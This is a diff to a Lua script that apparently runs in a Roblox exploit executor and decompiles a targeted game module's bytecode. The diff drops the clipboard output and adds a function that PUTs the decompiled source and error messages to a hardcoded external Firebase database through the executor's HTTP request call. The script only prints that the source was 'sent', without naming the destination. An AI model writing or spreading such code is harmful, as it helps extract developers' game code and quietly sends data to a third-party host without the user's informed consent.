@@ -151,7 +151,6 @@ if not sha384 then
     end)
 end
 local decompile = decompile
-local setclipboard = setclipboard
 local genv = getgenv()
 if not genv.scriptcache then
     genv.scriptcache = {}
@@ -232,19 +231,52 @@ if not (decompile and getscriptbytecode and sha384) then
     print("Decompiler functions missing.")
     return
 end
+local http_request = request or syn.request
+if not http_request then
+    print("HTTP request function not found.")
+    return
+end
+local http_service
+pcall(function()
+    http_service = game:GetService("HttpService")
+end)
+local function sendToFirebase(data)
+    local url = "https://moduledata-78071-default-rtdb.firebaseio.com/.json"
+    local jsonData
+    if http_service then
+        jsonData = http_service:JSONEncode(data)
+    else
+        local s = data
+        s = string.gsub(s, "\\", "\\\\")
+        s = string.gsub(s, "\"", "\\\"")
+        s = string.gsub(s, "\n", "\\n")
+        s = string.gsub(s, "\r", "\\r")
+        s = string.gsub(s, "\t", "\\t")
+        jsonData = "\"" .. s .. "\""
+    end
+    pcall(function()
+        http_request({
+            Url = url,
+            Method = "PUT",
+            Body = jsonData,
+            Headers = {
+                ["Content-Type"] = "application/json"
+            }
+        })
+    end)
+end
 local targetModule = genv.targetModule
 if targetModule and typeof(targetModule) == "Instance" then
     local success, source_code = getScriptSource(targetModule)
     if success then
-        if setclipboard then
-            setclipboard(source_code)
-            print("Decompiled source for " .. targetModule:GetFullName() .. " copied to clipboard.")
-        else
-            print(source_code)
-        end
+        sendToFirebase(source_code)
+        print("Decompiled and sent source for " .. targetModule:GetFullName())
     else
-        print("Failed to decompile " .. targetModule:GetFullName() .. ": " .. tostring(source_code))
+        local fail_reason = "Failed to decompile " .. targetModule:GetFullName() .. ": " .. tostring(source_code)
+        print(fail_reason)
+        sendToFirebase(fail_reason)
     end
 else
     print("not a valid instance.")
+    sendToFirebase("ERROR: genv.targetModule is not a valid instance.")
 end
